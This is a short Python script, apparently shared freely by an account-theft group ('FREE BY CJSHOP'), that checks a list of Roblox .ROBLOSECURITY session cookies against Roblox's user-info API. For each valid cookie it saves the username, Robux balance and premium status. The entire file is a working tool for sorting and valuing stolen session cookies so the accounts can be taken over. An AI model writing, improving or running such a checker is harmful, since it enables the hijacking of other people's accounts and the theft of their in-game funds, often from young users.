import requests
#Fuck You SKID. FREE SCRIPT
def check():
    lines = open('cookies.txt').read().splitlines()
    linesset = set(lines)
    for cookie in linesset:
        try:
            r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}).json()
            print("[>] Cookie Is Valid ...")
            filee = open("VaidCookie.txt", "a")
            filee.write(f"Cookie : {cookie}\nUser Id : " + str(r["UserID"]) +"\n" + "Username : " + str(r["UserName"]) +"\n"+ "Balance : " + str(r["RobuxBalance"]) +"\n"+ "Picture : " + str(r["ThumbnailUrl"]) +"\n"+ "Club Member : " + str(r["IsAnyBuildersClubMember"]) +"\n"+ "Premium : " + str(r["IsPremium"])+"\n-------------------------------------------------------------------------------- FREE BY CJSHOP--------------------------------------------------------------------------------\n")
        except Exception:
            print("[!] Cookie Is Invalid ...")
            fileee = open("InvaidCookie.txt", "a")
            fileee.write(cookie + "\n")
            fileee.close()

if __name__ == '__main__':
    check()




